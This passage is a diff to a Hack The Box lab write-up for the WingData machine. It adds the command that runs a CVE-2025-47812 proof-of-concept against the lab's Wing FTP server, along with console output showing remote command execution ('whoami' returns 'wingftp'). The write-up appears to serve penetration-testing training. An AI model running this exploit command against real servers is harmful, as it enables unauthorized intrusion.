@@ -550,7 +550,24 @@ Logic Flow of the Script:
 
 ### 3.2 Executing `CVE-2025-47812.py`
 
-**Command:** `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "id"`
+**Test for Vulnerability:** `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"`
+
+Output:
+
+```shell
+                                                                                                                    
+┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
+└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'
+[+] UID extracted: 9d52dcf82d167b395295d0451e0bcc03f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 9d52dcf82d167b395295d0451e0bcc03f528764d624db129b32c21fbca0cb8d6                                                                                                  
+
+--- Command Output ---                                                                                              
+wingftp
+----------------------
+```
 <div align="center">
 <br>
 <br>
